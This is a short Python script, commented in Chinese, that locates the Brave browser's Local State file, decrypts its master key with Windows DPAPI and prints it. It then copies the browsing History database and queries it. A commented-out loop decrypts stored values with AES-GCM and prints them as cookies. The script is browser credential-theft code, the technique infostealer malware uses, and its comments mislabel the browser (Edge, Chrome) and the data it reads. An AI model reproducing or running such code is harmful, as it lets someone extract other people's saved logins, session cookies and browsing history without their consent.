# coding: utf-8
import sqlite3	# https://www.runoob.com/sqlite/sqlite-python.html
import shutil	# https://blog.csdn.net/qq_40223983/article/details/95984230
from Crypto.Cipher import AES	# tips：dir(AES) MODE_xxx[GCM]		pip3 install pycryptodome
import base64
import os,json
import win32crypt

# 如何用 Python 破解 Edge 密码
#    加密 sqlite 文件路径: C:\Users<PC Name>\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data
#    解密密钥文件路径 C:\Users<PC Name>\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State


with open(r"%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State"%(os.environ['USERPROFILE']), "r", encoding='utf-8') as f:
	local_state = f.read()
	local_state = json.loads(local_state)
	secret_key = local_state["os_crypt"]["encrypted_key"]

secret_key = base64.b64decode(secret_key)
secret_key = secret_key[5:] 
secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
print(secret_key)

#Chrome username & password file path
chrome_path_history_db = r"%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"%(os.environ['USERPROFILE'])
shutil.copy2(chrome_path_history_db, "Loginvault.db") 	# 复制文件，保留元数据
#Connect to sqlite database
conn = sqlite3.connect("Loginvault.db")
cursor = conn.cursor()

'''history: History
clusters、clusters_and_visits、content_annotations、context_annotations、downloads、downloads_reroute_info、downloads_slices、downloads_url_chains、keyword_search_terms、meta、segment_usage、segments、sqlite_sequence、typed_url_sync_metadata、urls、visit_source、visits',)
cursor.execute("select name from sqlite_master where type='table' order by name")
print(cursor.fetchall())
'''
#cursor.execute("select name from sqlite_master where type='table' order by name")
#cursor.execute("PRAGMA table_info('cookies')")
cursor.execute("select count(*) from urls")
print(cursor.fetchall())	# 只能遍历一轮

'''
for index,login in enumerate(cursor.fetchall()): #遍历查询的所有结果
	host_key = login[0]
	name = login[1]
	encrypted_value= login[2]
	path= login[3]
	print("Cipher Text",encrypted_value)
	print("host_key:",host_key)
	print("path:",path)
	
	#Step 1：从密文中提取初始化向量
	initialisation_vector = encrypted_value[3:15]
	#Step 2：从密文中提取加密密码
	encrypted_password = encrypted_value[15:-16]
	#Step 3：构建AES算法来解密密码
	cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
	decrypted_pass = cipher.decrypt(encrypted_password)
	decrypted_pass = decrypted_pass.decode()
	#Step 4：解密密码
	print("Cookies:", name + "=" + decrypted_pass)
	print("*"*50)

'''
